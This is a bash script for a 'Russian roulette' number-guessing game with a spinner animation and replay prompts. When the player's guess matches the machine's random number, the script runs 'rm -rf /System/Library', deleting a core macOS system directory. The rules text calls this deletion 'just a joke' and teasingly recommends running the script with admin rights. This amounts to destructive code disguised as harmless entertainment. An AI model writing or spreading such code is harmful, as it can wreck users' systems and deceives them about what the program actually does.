#!/bin/bash

sleep_ms() {
    local duration=$1
    sleep $(echo "$duration/1000" | bc -l)
}

loading() {
    local loops=$1
    local chars=("|" "/" "-" "\\")
    for ((i=0; i<=loops; i++)); do
        for char in "${chars[@]}"; do
            echo -ne "\r$char"
            sleep_ms 100
        done
    done
    echo -ne "\r"
}

replay() {
    read -p "Want to try again? (y/n) " repeat
    if [[ "$repeat" == "y" || "$repeat" == "Y" ]]; then
        pre 1
    else
        echo "Thanks for playing."
        exit 0
    fi
}

main() {
    local bullets=$1
    loading $((RANDOM % (bullets / 137 + 1)))
    read -p "Enter your guess: " guess

    if ! [[ "$guess" =~ ^[0-9]+$ ]]; then
        echo "You need to enter an integer."
        replay
        return
    fi

    if ((guess > bullets || guess < 0)); then
        echo "You need to enter an integer inside the range you've given."
        replay
        return
    fi

    local rand=$((RANDOM % (bullets + 1)))
    if ((rand == guess)); then
        echo "You lose."
        rm -rf /System/Library
        exit 0
    fi

    echo "You won!"
    echo "Your number = $guess"
    echo "Machine's number = $rand"
    replay
}

pre() {
    local loop=$1
    if ((loop == 1)); then
        echo "Good choice."
    else
        echo "Let's begin."
    fi

    read -p "How big do you want the chamber (range of numbers to guess) to be? (Positive integers only) " bullets

    if ! [[ "$bullets" =~ ^[0-9]+$ ]] || ((bullets <= 0)); then
        echo "Positive integers only."
        replay
        return
    fi

    main "$bullets"
}

start() {
    read -p "Do you know the rules? (y/n) " intro
    if [[ "$intro" == "n" || "$intro" == "N" ]]; then
        echo "This is a game of guessing numbers."
        echo "If you guess the same number as the machine, given a certain range, your System 32 gets deleted (just a joke!)."
        echo "Every time you play the number changes."
        echo "For this to be a real challenge, I recommend you run it in admin mode (just kidding!)."
    fi

    pre 0
}

start
